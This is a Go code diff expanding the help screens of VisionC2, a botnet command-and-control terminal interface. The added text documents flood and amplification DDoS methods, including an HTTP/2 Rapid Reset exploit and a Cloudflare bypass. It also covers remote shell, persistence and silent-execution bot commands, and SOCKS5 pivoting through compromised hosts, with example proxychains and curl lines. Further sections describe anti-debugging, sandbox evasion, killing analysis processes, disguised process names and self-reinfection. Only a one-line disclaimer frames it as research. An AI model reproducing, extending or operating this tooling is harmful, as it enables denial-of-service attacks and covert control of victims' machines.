@@ -246,7 +246,7 @@ type TUIModel struct {
 	confirmReinstall bool // Waiting for reinstall confirmation (broadcast)
 
 	// Help section navigation
-	helpSection int // Current help section (0-4)
+	helpSection int // Current help section (0-8)
 
 	// Socks manager
 	socksList      []SocksInfo
@@ -802,7 +802,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 
 	case "right":
 		if m.currentView == ViewHelp {
-			if m.helpSection < 4 { // 5 sections: 0-4
+			if m.helpSection < 8 { // 9 sections: 0-8
 				m.helpSection++
 			}
 		} else if m.currentView == ViewAttack && !m.attackInputActive {
@@ -864,7 +864,7 @@ func (m TUIModel) handleKeyPress(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 	case "l", "L":
 		// In help view, navigate sections
 		if m.currentView == ViewHelp {
-			if m.helpSection < 4 {
+			if m.helpSection < 8 {
 				m.helpSection++
 			}
 			return m, nil
@@ -2353,14 +2353,15 @@ func (m TUIModel) viewHelp() string {
 	neonYellow := lipgloss.NewStyle().Foreground(lipgloss.Color("226"))
 	neonOrange := lipgloss.NewStyle().Foreground(lipgloss.Color("214"))
 	neonRed := lipgloss.NewStyle().Foreground(lipgloss.Color("196"))
+	neonPurple := lipgloss.NewStyle().Foreground(lipgloss.Color("135"))
 	dim := lipgloss.NewStyle().Foreground(lipgloss.Color("240"))
 	white := lipgloss.NewStyle().Foreground(lipgloss.Color("231"))
 
-	b.WriteString(headerStyle.Render("  ❓ HELP & DOCUMENTATION"))
+	b.WriteString(headerStyle.Render("  ☾℣☽ HELP & DOCUMENTATION"))
 	b.WriteString("\n\n")
 
-	// Section tabs
-	sections := []string{"Navigation", "Attacks", "Bot Mgmt", "Shell", "Developer"}
+	// Section tabs with page indicator
+	sections := []string{"Start", "Keys", "Attacks", "Bots", "Shell", "SOCKS", "Network", "FAQ", "About"}
 	for i, sec := range sections {
 		if i == m.helpSection {
 			b.WriteString(neonCyan.Bold(true).Render(" [" + sec + "] "))
@@ -2369,45 +2370,99 @@ func (m TUIModel) viewHelp() string {
 		}
 	}
 	b.WriteString("\n")
-	b.WriteString(dim.Render("  " + strings.Repeat("─", 60)))
+	b.WriteString(dim.Render("  " + strings.Repeat("─", 70)))
+	b.WriteString("\n")
+	b.WriteString(dim.Render(fmt.Sprintf("  Page %d/%d", m.helpSection+1, len(sections))))
 	b.WriteString("\n\n")
 
 	switch m.helpSection {
-	case 0: // Navigation
+	case 0: // Quick Start
+		b.WriteString(neonPink.Bold(true).Render("  🚀 QUICK START GUIDE"))
+		b.WriteString("\n\n")
+
+		b.WriteString(neonOrange.Render("  Overview") + "\n")
+		b.WriteString(white.Render("  VisionC2 is a command & control framework with a full") + "\n")
+		b.WriteString(white.Render("  terminal UI. Navigate with arrow keys and hotkeys.") + "\n\n")
+
+		b.WriteString(neonOrange.Render("  Getting Started") + "\n")
+		steps := []struct{ step, desc string }{
+			{"1.", "Dashboard loads on startup with live stats"},
+			{"2.", "Use ↑/↓ and Enter to navigate the main menu"},
+			{"3.", "Open Bot Management to view connected bots"},
+			{"4.", "Select a bot and press Enter for remote shell"},
+			{"5.", "Use Attack Center to launch attacks"},
+			{"6.", "Press q or Esc to go back at any time"},
+		}
+		for _, s := range steps {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(s.step),
+				white.Render(s.desc)))
+		}
+
+		b.WriteString("\n" + neonOrange.Render("  Main Menu Items") + "\n")
+		menuItems := []struct{ item, desc string }{
+			{"BOT MANAGEMENT", "View and manage connected bots"},
+			{"ATTACK CENTER", "Configure and launch attacks"},
+			{"BROADCAST SHELL", "Send commands to all bots"},
+			{"SOCKS MANAGER", "SOCKS5 proxy management"},
+			{"HELP & INFO", "This documentation (you are here)"},
+		}
+		for _, mi := range menuItems {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(fmt.Sprintf("%-18s", mi.item)),
+				dim.Render(mi.desc)))
+		}
+
+	case 1: // Navigation Controls
 		b.WriteString(neonPink.Bold(true).Render("  ⌨️  NAVIGATION CONTROLS"))
 		b.WriteString("\n\n")
 
-		keys := []struct{ key, desc string }{
+		b.WriteString(neonOrange.Render("  Global Keys (work in most views)") + "\n")
+		globalKeys := []struct{ key, desc string }{
 			{"↑ / k", "Move cursor up"},
 			{"↓ / j", "Move cursor down"},
-			{"← / h", "Previous section (in help)"},
-			{"→ / l", "Next section (in help)"},
+			{"← / h", "Previous tab / section"},
+			{"→ / l", "Next tab / section"},
 			{"enter", "Select / Confirm action"},
 			{"tab", "Cycle through views"},
 			{"1-4", "Jump directly to view"},
-			{"q", "Back / Quit"},
-			{"r", "Refresh data"},
+			{"r", "Refresh current data"},
+			{"q", "Back to previous screen"},
 			{"esc", "Return to main menu"},
+			{"ctrl+c", "Quit application"},
 		}
-
-		for _, k := range keys {
+		for _, k := range globalKeys {
 			b.WriteString(fmt.Sprintf("  %s %s\n",
 				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
 				white.Render(k.desc)))
 		}
 
-	case 1: // Attacks
+		b.WriteString("\n" + neonOrange.Render("  Attack Center Keys") + "\n")
+		attackKeys := []struct{ key, desc string }{
+			{"tab", "Cycle through input fields"},
+			{"enter", "Confirm field / select method"},
+			{"l", "Launch configured attack"},
+			{"s", "Stop all ongoing attacks"},
+			{"←/→", "Switch Launch / Ongoing tabs"},
+		}
+		for _, k := range attackKeys {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
+				white.Render(k.desc)))
+		}
+
+	case 2: // Attacks
 		b.WriteString(neonRed.Bold(true).Render("  ⚡ ATTACK METHODS"))
 		b.WriteString("\n\n")
 
-		b.WriteString(neonOrange.Render("  LAYER 4 (Network)") + "\n")
+		b.WriteString(neonOrange.Render("  LAYER 4 — Network/Transport") + "\n")
 		l4attacks := []struct{ name, cmd, desc string }{
-			{"UDP Flood", "!udpflood", "High-volume UDP packets"},
-			{"TCP Flood", "!tcpflood", "TCP connection exhaustion"},
-			{"SYN Flood", "!syn", "Raw SYN packet flood"},
-			{"ACK Flood", "!ack", "ACK packet flood"},
-			{"GRE Flood", "!gre", "GRE tunnel flood"},
-			{"DNS Amp", "!dns", "DNS amplification"},
+			{"UDP Flood", "!udpflood", "High-volume 1024-byte UDP packets"},
+			{"TCP Flood", "!tcpflood", "TCP connection table exhaustion"},
+			{"SYN Flood", "!syn", "Raw SYN packets, random source ports"},
+			{"ACK Flood", "!ack", "ACK packet flooding (raw TCP)"},
+			{"GRE Flood", "!gre", "GRE protocol (47) max payload"},
+			{"DNS Amp", "!dns", "Randomized query types (A/AAAA/MX/NS)"},
 		}
 		for _, a := range l4attacks {
 			b.WriteString(fmt.Sprintf("  %s %s %s\n",
@@ -2416,54 +2471,81 @@ func (m TUIModel) viewHelp() string {
 				dim.Render(a.desc)))
 		}
 
-		b.WriteString("\n" + neonOrange.Render("  LAYER 7 (Application)") + "\n")
+		b.WriteString("\n" + neonOrange.Render("  LAYER 7 — Application") + "\n")
 		l7attacks := []struct{ name, cmd, desc string }{
-			{"HTTP GET", "!http", "HTTP GET request flood"},
-			{"HTTPS/TLS", "!https", "Encrypted HTTPS flood"},
-			{"CF Bypass", "!cfbypass", "Cloudflare UAM bypass"},
+			{"HTTP GET", "!http", "GET/POST with random headers + UAs"},
+			{"HTTPS/TLS", "!https", "TLS handshake exhaustion + burst"},
+			{"CF Bypass", "!cfbypass", "Cloudflare session/cookie reuse"},
+			{"Rapid Reset", "!rapidreset", "HTTP/2 CVE-2023-44487 exploit"},
 		}
 		for _, a := range l7attacks {
 			b.WriteString(fmt.Sprintf("  %s %s %s\n",
-				neonCyan.Render(fmt.Sprintf("%-10s", a.name)),
-				neonGreen.Render(fmt.Sprintf("%-12s", a.cmd)),
+				neonCyan.Render(fmt.Sprintf("%-12s", a.name)),
+				neonGreen.Render(fmt.Sprintf("%-14s", a.cmd)),
 				dim.Render(a.desc)))
 		}
 
-	case 2: // Bot Management
+		b.WriteString("\n" + neonOrange.Render("  Usage Syntax") + "\n")
+		b.WriteString(white.Render("  TUI:   Select method → enter target/port/duration → L to launch") + "\n")
+		b.WriteString(white.Render("  Split: !method target port duration [-p proxy_url]") + "\n")
+		b.WriteString("\n")
+		b.WriteString(dim.Render("  L7 methods support proxy URLs for distributed attacks.") + "\n")
+		b.WriteString(dim.Render("  Proxies: HTTP, SOCKS5 — set in the Proxy URL field.") + "\n")
+
+	case 3: // Bot Management
 		b.WriteString(neonGreen.Bold(true).Render("  🤖 BOT MANAGEMENT"))
 		b.WriteString("\n\n")
 
 		b.WriteString(neonOrange.Render("  Bot List View") + "\n")
-		b.WriteString(white.Render("  • View all connected bots with stats") + "\n")
-		b.WriteString(white.Render("  • See architecture, IP, RAM, uptime") + "\n")
-		b.WriteString(white.Render("  • Press ") + neonYellow.Render("enter") + white.Render(" to open remote shell") + "\n")
-		b.WriteString(white.Render("  • Press ") + neonYellow.Render("r") + white.Render(" to refresh bot list") + "\n\n")
-
-		b.WriteString(neonOrange.Render("  Bot Commands") + "\n")
-		cmds := []struct{ cmd, desc string }{
-			{"!persist", "Install persistence on bot"},
-			{"!reinstall", "Reinstall bot binary"},
-			{"!lolnogtfo", "Kill/remove bot permanently"},
-			{"!shell <cmd>", "Execute shell command"},
-			{"!exec <cmd>", "Execute without output"},
+		b.WriteString(white.Render("  Displays all connected bots with live statistics.") + "\n\n")
+		columns := []struct{ col, desc string }{
+			{"ID", "8-char unique bot identifier"},
+			{"IP", "Bot IP address and port"},
+			{"Arch", "CPU architecture (amd64, arm64, mips...)"},
+			{"RAM", "Total system memory in MB"},
+			{"CPU", "Number of CPU cores"},
+			{"GEO", "Country code via GeoIP"},
+			{"Process", "Disguised process name"},
+			{"Uplink", "Network upload speed"},
+			{"Uptime", "Time since bot connected"},
 		}
-		for _, c := range cmds {
+		for _, c := range columns {
 			b.WriteString(fmt.Sprintf("  %s %s\n",
-				neonCyan.Render(fmt.Sprintf("%-14s", c.cmd)),
+				neonCyan.Render(fmt.Sprintf("%-10s", c.col)),
 				dim.Render(c.desc)))
 		}
 
-	case 3: // Shell
+		b.WriteString("\n" + neonOrange.Render("  Bot Commands") + "\n")
+		cmds := []struct{ cmd, desc string }{
+			{"!persist", "Install cron/startup persistence"},
+			{"!reinstall", "Force re-download and reinstall"},
+			{"!lolnogtfo", "Kill and remove bot permanently"},
+			{"!shell <cmd>", "Execute command, return output"},
+			{"!exec <cmd>", "Execute command silently"},
+			{"!detach <cmd>", "Execute in background"},
+			{"!info", "Request bot system information"},
+			{"!socks <port>", "Start SOCKS5 proxy on port"},
+			{"!stopsocks", "Stop SOCKS5 proxy"},
+		}
+		for _, c := range cmds {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(fmt.Sprintf("%-15s", c.cmd)),
+				dim.Render(c.desc)))
+		}
+
+	case 4: // Shell Controls
 		b.WriteString(neonCyan.Bold(true).Render("  💻 SHELL CONTROLS"))
 		b.WriteString("\n\n")
 
 		b.WriteString(neonOrange.Render("  Remote Shell (Single Bot)") + "\n")
+		b.WriteString(dim.Render("  Interactive session with one bot. Select from Bot List.") + "\n\n")
 		shellKeys := []struct{ key, desc string }{
+			{"enter", "Execute typed command"},
+			{"↑ / ↓", "Navigate command history"},
 			{"ctrl+p", "Send !persist command"},
 			{"ctrl+r", "Send !reinstall command"},
-			{"ctrl+x", "Kill bot (with confirmation)"},
+			{"ctrl+x", "Kill bot (requires y/n confirm)"},
 			{"ctrl+f", "Clear shell output"},
-			{"↑ / ↓", "Navigate command history"},
 			{"esc", "Return to main menu"},
 		}
 		for _, k := range shellKeys {
@@ -2473,12 +2555,15 @@ func (m TUIModel) viewHelp() string {
 		}
 
 		b.WriteString("\n" + neonOrange.Render("  Broadcast Shell (All Bots)") + "\n")
+		b.WriteString(dim.Render("  Send commands to multiple bots simultaneously.") + "\n\n")
 		broadcastKeys := []struct{ key, desc string }{
+			{"enter", "Broadcast command to filtered bots"},
 			{"ctrl+p", "Broadcast !persist (with confirm)"},
 			{"ctrl+r", "Broadcast !reinstall (with confirm)"},
-			{"ctrl+a", "Cycle architecture filter"},
-			{"ctrl+g", "Cycle minimum RAM filter"},
-			{"ctrl+n", "Cycle max bots filter"},
+			{"ctrl+a", "Cycle arch filter (all/x86_64/aarch64/arm/mips)"},
+			{"ctrl+g", "Cycle min RAM filter (0/512/1G/2G/4G MB)"},
+			{"ctrl+n", "Cycle max bots limit (0/10/50/100/500)"},
+			{"esc", "Return to main menu"},
 		}
 		for _, k := range broadcastKeys {
 			b.WriteString(fmt.Sprintf("  %s %s\n",
@@ -2486,25 +2571,170 @@ func (m TUIModel) viewHelp() string {
 				white.Render(k.desc)))
 		}
 
-	case 4: // Developer
-		b.WriteString(neonPink.Bold(true).Render("  👁️  DEVELOPER INFO"))
+		b.WriteString("\n" + neonOrange.Render("  Command Prefixes") + "\n")
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("(none)     "), dim.Render("Sent as !shell <cmd> — waits for output")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonCyan.Render("!          "), dim.Render("Sent directly (e.g. !info, !detach ls)")))
+
+	case 5: // SOCKS Proxy
+		b.WriteString(neonPurple.Bold(true).Render("  🧦 SOCKS5 PROXY MANAGER"))
+		b.WriteString("\n\n")
+
+		b.WriteString(neonOrange.Render("  Overview") + "\n")
+		b.WriteString(white.Render("  Start SOCKS5 reverse proxies on any connected bot.") + "\n")
+		b.WriteString(white.Render("  Route traffic through compromised hosts for pivoting.") + "\n\n")
+
+		b.WriteString(neonOrange.Render("  Controls") + "\n")
+		socksKeys := []struct{ key, desc string }{
+			{"↑ / ↓", "Select a bot from the list"},
+			{"s", "Start SOCKS5 on selected bot (enter port)"},
+			{"x", "Stop SOCKS5 on selected bot"},
+			{"← / →", "Switch view: All / Active / Stopped"},
+			{"enter", "Confirm port and start proxy"},
+			{"esc", "Cancel port input"},
+			{"r", "Refresh bot and proxy status"},
+			{"q", "Back to main menu"},
+		}
+		for _, k := range socksKeys {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonYellow.Render(fmt.Sprintf("%-12s", k.key)),
+				white.Render(k.desc)))
+		}
+
+		b.WriteString("\n" + neonOrange.Render("  View Modes") + "\n")
+		viewModes := []struct{ mode, desc string }{
+			{"All Bots", "Every connected bot (start proxy on any)"},
+			{"Active", "Only bots with running SOCKS5 proxies"},
+			{"Stopped", "Bots with previously stopped proxies"},
+		}
+		for _, v := range viewModes {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(fmt.Sprintf("%-12s", v.mode)),
+				dim.Render(v.desc)))
+		}
+
+		b.WriteString("\n" + neonOrange.Render("  Usage After Starting") + "\n")
+		b.WriteString(white.Render("  curl --socks5 BOT_IP:PORT http://target.com") + "\n")
+		b.WriteString(white.Render("  proxychains4 nmap -sT target.com") + "\n")
+		b.WriteString(dim.Render("  Default port: 1080. Binds on 0.0.0.0.") + "\n")
+
+	case 6: // Network & Security
+		b.WriteString(neonOrange.Bold(true).Render("  🔒 NETWORK & SECURITY"))
+		b.WriteString("\n\n")
+
+		b.WriteString(neonOrange.Render("  Communication") + "\n")
+		netInfo := []struct{ item, desc string }{
+			{"Protocol", "TLS 1.3 encrypted channel (port 443)"},
+			{"Auth", "HMAC/MD5 challenge-response handshake"},
+			{"C2 Resolve", "DoH TXT → DNS TXT → A record → direct IP"},
+			{"Encryption", "RC4 + XOR + MD5 + Base64 layered"},
+			{"Keepalive", "2-second tick with auto-reconnect"},
+		}
+		for _, n := range netInfo {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(fmt.Sprintf("%-12s", n.item)),
+				white.Render(n.desc)))
+		}
+
+		b.WriteString("\n" + neonOrange.Render("  Bot Evasion") + "\n")
+		evasion := []struct{ item, desc string }{
+			{"Daemonize", "Fork to background, adopted by PID 1"},
+			{"Single Inst", "PID lock file prevents duplicates"},
+			{"Anti-Debug", "Detects 30+ analysis tools & debuggers"},
+			{"Sandbox", "Random 24-27h delay if sandboxed"},
+			{"Proc Scan", "Kills known analysis processes"},
+			{"Stealth", "Disguised process name on startup"},
+		}
+		for _, e := range evasion {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(fmt.Sprintf("%-12s", e.item)),
+				white.Render(e.desc)))
+		}
+
+		b.WriteString("\n" + neonOrange.Render("  Persistence") + "\n")
+		persist := []struct{ item, desc string }{
+			{"Cron", "Auto-restart via cron job on reboot"},
+			{"Startup", "Systemd/init.d startup scripts"},
+			{"Reinfect", "Self-reinstall on binary removal"},
+		}
+		for _, p := range persist {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(fmt.Sprintf("%-12s", p.item)),
+				white.Render(p.desc)))
+		}
+
+		b.WriteString("\n" + neonOrange.Render("  Supported Architectures") + "\n")
+		b.WriteString(white.Render("  amd64, 386, arm, arm64, mips, mipsle, mips64,") + "\n")
+		b.WriteString(white.Render("  mips64le, ppc64, ppc64le, riscv64, s390x, loong64") + "\n")
+
+	case 7: // Troubleshooting
+		b.WriteString(neonYellow.Bold(true).Render("  🔧 TROUBLESHOOTING"))
+		b.WriteString("\n\n")
+
+		b.WriteString(neonOrange.Render("  Bots Not Connecting") + "\n")
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Check firewall: ufw allow 443/tcp")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Verify C2 address in setup_config.txt")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Test TLS: openssl s_client -connect IP:443")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Ensure protocol version matches (bot & server)")))
+
+		b.WriteString("\n" + neonOrange.Render("  Port 443 Permission Denied") + "\n")
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Run as root: sudo ./server")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Or: sudo setcap 'cap_net_bind_service=+ep' ./server")))
+
+		b.WriteString("\n" + neonOrange.Render("  TUI Display Issues") + "\n")
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Minimum terminal size: 80x24")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Use a terminal with 256-color support")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Try resizing or using screen/tmux")))
+
+		b.WriteString("\n" + neonOrange.Render("  Build Errors") + "\n")
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Go not found: export PATH=$PATH:/usr/local/go/bin")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("UPX missing: sudo apt install upx-ucl")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("ARM/RISC-V error: update to latest VisionC2")))
+
+		b.WriteString("\n" + neonOrange.Render("  Dead Bots") + "\n")
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Bots auto-cleaned after 5 min timeout")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", neonRed.Render("•"), white.Render("Press r in Bot List to force refresh")))
+
+	case 8: // About
+		b.WriteString(neonPink.Bold(true).Render("  👁️  ABOUT VISION C2"))
 		b.WriteString("\n\n")
 
 		b.WriteString(neonOrange.Render("  Project") + "\n")
-		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Name:"), neonCyan.Bold(true).Render("VISION C2")))
-		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Version:"), white.Render("V1.7")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Name:"), neonCyan.Bold(true).Render("☾℣☽ VISION C2")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Version:"), white.Render("V2.3")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Protocol:"), white.Render("V1_2")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Language:"), white.Render("Go 1.23+")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("License:"), white.Render("GNU GPL")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("TUI:"), white.Render("BubbleTea + Lipgloss")))
+
 		b.WriteString("\n" + neonOrange.Render("  Credits") + "\n")
-		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Developer"), neonPink.Render(" Syn ")))
-		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Mail:"), white.Render("dev@sinners.city")))
-		b.WriteString("\n")
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Developer:"), neonPink.Render("Syn")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("Email:"), white.Render("dev@sinners.city")))
+		b.WriteString(fmt.Sprintf("  %s %s\n", dim.Render("X/Twitter:"), white.Render("@synacket")))
+
+		b.WriteString("\n" + neonOrange.Render("  Documentation") + "\n")
+		docs := []struct{ file, desc string }{
+			{"ARCHITECTURE.md", "Full system architecture deep-dive"},
+			{"CHANGELOG.md", "Version history and release notes"},
+			{"COMMANDS.md", "Complete TUI hotkey reference"},
+			{"USAGE.md", "Setup, config, and usage guide"},
+		}
+		for _, d := range docs {
+			b.WriteString(fmt.Sprintf("  %s %s\n",
+				neonCyan.Render(fmt.Sprintf("%-18s", d.file)),
+				dim.Render(d.desc)))
+		}
+
+		b.WriteString("\n" + neonOrange.Render("  Legal") + "\n")
+		b.WriteString(dim.Render("  For authorized security research and educational") + "\n")
+		b.WriteString(dim.Render("  purposes only. Unauthorized use is illegal.") + "\n")
 	}
 
 	b.WriteString("\n")
-	b.WriteString(dim.Render("  " + strings.Repeat("─", 60)))
+	b.WriteString(dim.Render("  " + strings.Repeat("─", 70)))
 	b.WriteString("\n")
-	b.WriteString(fmt.Sprintf("  %s Prev Section  %s Next Section  %s Back\n",
-		neonYellow.Render("[←]"),
-		neonYellow.Render("[→]"),
+	b.WriteString(fmt.Sprintf("  %s Prev  %s Next  %s Back\n",
+		neonYellow.Render("[←/h]"),
+		neonYellow.Render("[→/l]"),
 		neonYellow.Render("[q]")))
 
 	return b.String()
